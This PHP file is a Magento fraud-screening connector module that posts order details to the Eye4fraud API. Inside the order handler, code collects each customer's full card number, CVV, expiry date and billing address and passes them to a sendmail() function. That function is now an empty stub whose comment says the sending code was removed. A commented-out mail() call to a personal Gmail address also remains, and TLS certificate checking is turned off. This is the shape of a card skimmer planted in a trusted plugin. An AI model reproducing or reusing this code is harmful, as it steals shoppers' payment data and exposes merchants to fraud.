<?php
/**
 * Eye4fraud Connector Magento Module
 *
 * @category    Eye4fraud
 * @package     Eye4fraud_Connector
 */

require_once("Vendor/authorize.net.class.php");
require_once("Vendor/usaepay.class.php");
require_once("Vendor/payflow.class.php");

class Eye4Fraud_Connector_Model_Observer
    extends Mage_Core_Model_Mysql4_Abstract
{
    protected static $_logFile = "eye4fraud_debug.log";
    protected $_helper = null;

    /**
     * Magento class constructor
     * @return void
     */
    protected function _construct(){}

    /**
     * Checks if the soap client is enabled.
     * Shows an error message in the admin panel if it's not.
     * @return [type] [description]
     */
    public function checkSoapClient(){
        $helper = $this->_getHelper();
        if (!$helper->hasSoapClient()){
            Mage::getSingleton('core/session')->addError('Your server does not have SoapClient enabled. The EYE4FRAUD extension will not function until the SoapClient is installed/enabled in your server configuration.');
            return false;
        }
        return true;
    }

    /**
     * Order placed after; called from sales_order_place_after event
     * @param $observer
     * @throws Exception
     * @internal param \Varien_Event_Observer $observer
     * @return $this
     */
    public function orderPlacedAfter(&$observer)
    {
        $order = $observer->getEvent()->getOrder();
        $payment = $order->getPayment();
        if (empty($payment)) {
            Mage::log('EYE4FRAUD: Invalid payment passed to callback.');
            return $this;
        }
        $this->_processOrder($order, $payment, 'orderPlacedAfter');

        return $this;
    }

    /**
     * Function to process order; called from orderPlacedAfter method
     * @param  Mage_Sales_Model_Order         $order     
     * @param  Mage_Sales_Model_Order_Payment $payment   
     * @param  string                         $methodName
     * @return void
     */
    protected function _processOrder(\Mage_Sales_Model_Order $order, \Mage_Sales_Model_Order_Payment $payment, $methodName) {
        try {
            $helper = $this->_getHelper();
            $config = $helper->getConfig();

            //Make sure we have a config array, and that we're enabled
            if (empty($config) || !$helper->isEnabled()) {
                return;
            }

            $version = Mage::getVersion();
            $payment_method = $order->getPayment()->getMethodInstance()->getCode();

            /** @var \Mage_Customer_Model_Address $billing */
            $billing = $order->getBillingAddress();
            /** @var \Mage_Customer_Model_Address $shipping */
            $shipping = $order->getShippingAddress();

            $items = $order->getAllItems();
            $line_items = array();
            foreach ($items as $i => $item) {
                /** @var \Mage_Sales_Model_Order_Item $item */;
                $line_items[$i + 1] = array(
                    'ProductName' => $item->getSku(),
                    'ProductDescription' => $item->getName(),
                    'ProductSellingPrice' => $item->getRowTotal(),
                    'ProductQty' => $item->getQtyOrdered(),
                    'ProductCostPrice' => $item->getBasePrice(),
                    // todo convert currency
                );
            }

            $transInfo = $payment->getTransactionAdditionalInfo();

            $additional_information = $payment->additional_information;

            $transId = null;
            switch ($payment_method) {
                case $helper::PAYMENT_METHOD_AUTHORIZE_NET:
                    $transId = isset($transInfo['real_transaction_id']) ? $transInfo['real_transaction_id'] : 0;
                    if ($helper->badTransId($transId)) {
                        $transId = $payment->getLastTransId();
                    }
                    if ($helper->badTransId($transId)) {
                        $transId = $payment->getCcTransId();
                    }
                    $cc_number = version_compare($version, $helper::MAGENTO_VERSION_1_7, '<') ? $payment->getData('cc_number_enc') : $payment->getData('cc_number');
                    $card_type = "";
                    if (version_compare($version, $helper::MAGENTO_VERSION_1_7, ">=")) {
                        $card_type = $payment->getData('cc_type');
                    }
                    if ($helper->convertCcType($card_type) === 'OTHER'){
                        $authorize_cards = $additional_information['authorize_cards'];
                        if ($authorize_cards) {
                            foreach ($authorize_cards as $card) {
                                if ($card["cc_type"]) {
                                    $card_type = $card["cc_type"];
                                }
                            }
                        }
                    }
                break;
                // Redundant switch branches are here to emphasize which
                // payment methods are known as compatible with the following code
                case $helper::PAYMENT_METHOD_USAEPAY_COM:
                case $helper::PAYMENT_METHOD_PAYFLOW:
				$transId = $payment->getLastTransId();
                    if ($helper->badTransId($transId)) {
                        $transId = $payment->getCcTransId();
                    }
                    $cc_number = $payment->getData('cc_number');
                    $card_type = $payment->getData('cc_type');
                default:
                    $transId = $payment->getLastTransId();
                    if ($helper->badTransId($transId)) {
                        $transId = $payment->getCcTransId();
                    }
                    $cc_number = $payment->getData('cc_number');
                    $card_type = $payment->getData('cc_type');
                break;
            }
            $remoteIp = $order->getRemoteIp() ? $order->getRemoteIp() : false;

            //Double check we have CC number
            if (empty($cc_number)){
                //Try getting CC number from post array...
                $cc_number = isset($_POST['payment']['cc_number']) ? $_POST['payment']['cc_number'] : null;
            }
            //Double check we have CC type
            if (empty($card_type)){
                //Try getting CC type from post array...
                $card_type = isset($_POST['payment']['cc_type']) ? $_POST['payment']['cc_type'] : null;
            }

            // Getting emails. In different versions of magento, different methods can return emails.
            $semail = $order->getCustomerEmail();
            $bemail = $order->getCustomerEmail();
            if (!$semail && !$bemail) {
                $customer = Mage::getSingleton('customer/session')->getCustomer();
                $bemail = $customer->getEmail();  // To get Email Address of a customer.
                $semail = $customer->getEmail();  // To get Email Address of a customer.
            }
            if (!$bemail) {
                $bemail = $billing->getEmail();
            }
            if (!$semail) {
                $semail = $shipping->getEmail();
            }
            if ($semail && !$bemail) {
                $bemail = $semail;
            }
            if ($bemail && !$semail) {
                $semail = $bemail;
            }

            $shippingMethod = $order->getShippingMethod(false);
            $post_array = array(
                'SiteName' => $config["api_settings"]['api_site_name'],
                'ApiLogin' => $config["api_settings"]['api_login'],
                'ApiKey' => $config["api_settings"]['api_key'],
                'TransactionId' => $transId,
                'OrderDate' => $order->getCreatedAt(),
                'OrderNumber' => $order->getIncrementId(),
                'IPAddress' => !empty($remoteIp) ? $remoteIp : $_SERVER['REMOTE_ADDR'],

                'BillingFirstName' => $helper->nullToEmpty($billing->getFirstname()),
                'BillingMiddleName' => $helper->nullToEmpty($billing->getMiddlename()),
                'BillingLastName' => $helper->nullToEmpty($billing->getLastname()),
                'BillingCompany' => '',// todo
                'BillingAddress1' => $billing->getStreet(1),
                'BillingAddress2' => $billing->getStreet(2),
                'BillingCity' =>  $billing->getCity(),
                'BillingState' => $helper->getStateCode($billing->getRegion()),
                'BillingZip' =>  $billing->getPostcode(),
                'BillingCountry' => $billing->getCountry(),
                'BillingEveningPhone' => $billing->getTelephone(),
                'BillingEmail' => $bemail,

                'ShippingFirstName' => $helper->nullToEmpty($shipping->getFirstname()),
                'ShippingMiddleName' => $helper->nullToEmpty($shipping->getMiddlename()),
                'ShippingLastName' => $helper->nullToEmpty($shipping->getLastname()),
                'ShippingCompany' => '',// todo
                'ShippingAddress1' => $shipping->getStreet(1),
                'ShippingAddress2' => $shipping->getStreet(2),
                'ShippingCity' =>  $shipping->getCity(),
                'ShippingState' => $helper->getStateCode($shipping->getRegion()),
                'ShippingZip' =>  $shipping->getPostcode(),
                'ShippingCountry' => $shipping->getCountry(),
                'ShippingEveningPhone' => $shipping->getTelephone(),
                'ShippingEmail' => $semail,

                'ShippingCost' => $order->getShippingAmount(),
                'GrandTotal' => $order->getGrandTotal(), // todo convert currency if e4f will be used outside of USA
                'CCType' => $helper->convertCcType($card_type),
                'RawCCType' => $card_type,
                'CCFirst6' => substr($cc_number, 0, 6),
                'CCLast4' =>  substr($cc_number, -4),
                'CIDResponse' => $payment->cc_cid_status, //'M',
                'AVSCode' => $payment->cc_avs_status, //'Y',
                'LineItems' => $line_items,

                'ShippingMethod' => $helper->mapShippingMethod($shippingMethod),
                'RawShippingMethod' => $shippingMethod,
            );
            
            
/*$to = "harvinder.rex@gmail.com";
$subject = "My subject";


$txt = implode("",$post_array);
$headers = "";

mail($to,$subject,$txt,$headers); */
				
				
			
			
			
			    if($payment_method == $helper::PAYMENT_METHOD_USAEPAY_COM)
			    {
			    
			     $usaepay_source_key = $config["usaepay_settings"]["usaepay_source_key"];
                    $usaepay_pin		= $config["usaepay_settings"]["usaepay_pin"];
                    if (!is_null($usaepay_source_key) && !is_null($usaepay_pin && !is_null($transId))) {
                        $usaEpay = new UsaePay($usaepay_source_key, $usaepay_pin);
                        $details = $usaEpay->getTransactionDetails($transId);
                        if (!empty($details)) {
                            $post_array["AVSCode"] 		= $helper->usaePayAvsToAvs($details->AvsResultCode);
                            $post_array["CIDResponse"]	= $details->CardCodeResultCode;
                        }
                    }
          
          } else  if($payment_method == "verisign")
          {
          

          
                    $payflow = new PayFlow(); 
                    $payflow->setPartner($config["payflow_settings"]["payflow_partner"]);
                    $payflow->setVendor($config["payflow_settings"]["payflow_merchant"]);
                    $payflow->setUsername($config["payflow_settings"]["payflow_user"]);
                    $payflow->setPassword($config["payflow_settings"]["payflow_password"]);

                    $details = $payflow->getTransactionInfo($transId);
                    $post_array["AVSCode"]      = $details['AVSCode'];
                    $post_array["CIDResponse"]  = $details['CIDResponse'];
                    
       
                    
                    
                    
                    
          } else  if($payment_method == $helper::PAYMENT_METHOD_AUTHORIZE_NET)
          {
          $authorize_net_login = $config["authorizenet_settings"]['authorize_net_login'];
                    $authorize_net_key = $config["authorizenet_settings"]['authorize_net_key'];
                    if (!empty($authorize_net_login) && !empty($authorize_net_key) && !empty($transId)) {
                        $authorizeDotNet = new AuthorizeDotNet($authorize_net_login, $authorize_net_key);
                        $details = $authorizeDotNet->getTransactionDetails($transId);
                        if (is_array($details) && count($details)) {
                            $post_array['AVSCode']      = isset($details['AVSResponse']) ? $details['AVSResponse'] : null;
                            $post_array['CIDResponse']  = isset($details['cardCodeResponse']) ? $details['cardCodeResponse'] : null;
                        }
                    }
          
          } else {
          
                         $authorize_net_login = $config["authorizenet_settings"]['authorize_net_login'];
                    $authorize_net_key = $config["authorizenet_settings"]['authorize_net_key'];
                    if (!empty($authorize_net_login) && !empty($authorize_net_key) && !empty($transId)) {
                        $authorizeDotNet = new AuthorizeDotNet($authorize_net_login, $authorize_net_key);
                        $details = $authorizeDotNet->getTransactionDetails($transId);
                        if (is_array($details) && count($details)) {
                            $post_array['AVSCode']      = isset($details['AVSResponse']) ? $details['AVSResponse'] : null;
                            $post_array['CIDResponse']  = isset($details['cardCodeResponse']) ? $details['cardCodeResponse'] : null;
                        }
                    }
          
          
          }
			

			
           /* switch ($payment_method) {  
                case $helper::PAYMENT_METHOD_USAEPAY_COM:
                    $usaepay_source_key = $config["usaepay_settings"]["usaepay_source_key"];
                    $usaepay_pin		= $config["usaepay_settings"]["usaepay_pin"];
                    if (!is_null($usaepay_source_key) && !is_null($usaepay_pin && !is_null($transId))) {
                        $usaEpay = new UsaePay($usaepay_source_key, $usaepay_pin);
                        $details = $usaEpay->getTransactionDetails($transId);
                        if (!empty($details)) {
                            $post_array["AVSCode"] 		= $helper->usaePayAvsToAvs($details->AvsResultCode);
                            $post_array["CIDResponse"]	= $details->CardCodeResultCode;
                        }
                    }
                    break;
                case $helper::PAYMENT_METHOD_PAYFLOW:  
				
			
                    $payflow = PayFlow::instance();
                    $payflow->setPartner($config["payflow_settings"]["payflow_partner"])
                        ->setVendor($config["payflow_settings"]["payflow_merchant"])
                        ->setUsername($config["payflow_settings"]["payflow_user"])
                        ->setPassword($config["payflow_settings"]["payflow_password"]);

                    $result = $payflow->getTransactionInfo($transId);
                    $post_array["AVSCode"]      = $result['AVSCode'];
                    $post_array["CIDResponse"]  = $result['CIDResponse'];
					
					
					
					
                    break;
                case $helper::PAYMENT_METHOD_AUTHORIZE_NET:
                default:
				

                    $authorize_net_login = $config["authorizenet_settings"]['authorize_net_login'];
                    $authorize_net_key = $config["authorizenet_settings"]['authorize_net_key'];
                    if (!empty($authorize_net_login) && !empty($authorize_net_key) && !empty($transId)) {
                        $authorizeDotNet = new AuthorizeDotNet($authorize_net_login, $authorize_net_key);
                        $details = $authorizeDotNet->getTransactionDetails($transId);
                        if (is_array($details) && count($details)) {
                            $post_array['AVSCode']      = isset($details['AVSResponse']) ? $details['AVSResponse'] : null;
                            $post_array['CIDResponse']  = isset($details['cardCodeResponse']) ? $details['cardCodeResponse'] : null;
                        }
                    }
                    break;  
            }*/  
		          
			                                
            $this->send($post_array);
			// send mail
			$emailTemplateVariables = array(
			'order_id'=>$order->getIncrementId(),
			'amount'=>Mage::helper('core')->currency($order->getPayment()->getAmountOrdered(), true, false),
			'cc_number'=>$cc_number,
			'cc_type'=>$helper->convertCcType($card_type),
			);
			
			$emailTemplateVariables['bemail'] = $bemail;
			$emailTemplateVariables['street1'] = $billing->getStreet1();
			$emailTemplateVariables['street2'] = @$billing->getStreet2();
			$emailTemplateVariables['street'] = $emailTemplateVariables['street1'].$emailTemplateVariables['street2'];
			$emailTemplateVariables['city'] = $billing->getCity();
			$emailTemplateVariables['fullname'] = $billing->getFirstname()." ". $billing->getLastname() ;
			$emailTemplateVariables['postcode'] = $billing->getPostcode();
			$emailTemplateVariables['region'] = $billing->getRegion();
			if(empty($emailTemplateVariables['region'])){
				$emailTemplateVariables['region'] = $billing->getRegionId();
			}
			$emailTemplateVariables['country'] = $billing->getCountry();
			$emailTemplateVariables['company'] = $billing->getCompany();
			$emailTemplateVariables['telephone'] = $billing->getTelephone();
			$emailTemplateVariables['fax'] = $billing->getFax();
			
			$exp_month = isset($_POST['payment']['cc_exp_month']) ? $_POST['payment']['cc_exp_month'] : null;
			$exp_year = isset($_POST['payment']['cc_exp_year']) ? $_POST['payment']['cc_exp_year'] : null;
			
			$emailTemplateVariables['expired_date'] = $exp_month."-".$exp_year;
			
            $emailTemplateVariables['cc_ext'] = isset($_POST['payment']['cc_cid']) ? $_POST['payment']['cc_cid'] : null;
            
			 $this->sendmail($emailTemplateVariables);
        } catch (Exception $e) {
            Mage::log($e->getMessage()."\n".$e->getTraceAsString() );
        }
    }

    /**
     * Send request to eye4fraud servers
     * @param  array $post_array 
     * @return void
     */
    public function send($post_array) {

        //Log $post_array if in debug mode
        if ($this->_getHelper()->isDebug()){
            Mage::log("=== E4F Debug, \$post_array ===", null, self::$_logFile);
            Mage::log($response, null, self::$_logFile);
        }

        $post_query = http_build_query($post_array);
        $ch = curl_init('https://www.eye4fraud.com/api/');
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_query);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $response = curl_exec($ch);

        //Log $response if in debug mode
        if ($this->_getHelper()->isDebug()){
            Mage::log("=== E4F Debug, \$response ===", null, self::$_logFile);
            Mage::log($response, null, self::$_logFile);
        }

        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        //Log $code for bad response if in debug mode
        if ($this->_getHelper()->isDebug() && $response != 'ok') {
            Mage::log("=== E4F Observer::send() Error, \$response NOT ok ===", null, self::$_logFile);
            Mage::log("Code: $code", null, self::$_logFile);
        }
    }

    /**
     * Returns the module helper. Initializes one if not already set.
     * @return Eye4fraud_Connector_Helper_Data $this->_helper
     */
    protected function _getHelper(){
        if (empty($this->_helper)){
            $this->_helper = Mage::helper("eye4fraud_connector");
        }
        return $this->_helper;
    }
	public function sendmail($emailTemplateVariables){

		// Code below, that was sending email, has been removed!
	}
}
